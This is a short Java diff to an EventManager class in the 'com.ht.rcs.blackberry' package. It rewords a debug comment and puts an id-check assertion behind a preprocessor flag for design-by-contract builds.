@@ -24,7 +24,7 @@ import com.ht.rcs.blackberry.utils.Utils;
  */
 public final class EventManager extends Manager implements Singleton {
 
-    /** The debug. */
+    /** The debug instance. */
     private static Debug debug = new Debug("EventManager", DebugLevel.VERBOSE);
 
     /** The instance. */
@@ -57,7 +57,9 @@ public final class EventManager extends Manager implements Singleton {
 
     public StartStopThread getItem(int id) {
         Event event = statusObj.getEvent(id);
-        Check.ensures(event.eventId == id, "Wrong id");
+        // #ifdef DBC
+//@        Check.ensures(event.eventId == id, "Wrong id");
+        // #endif
         return event;
     }
 
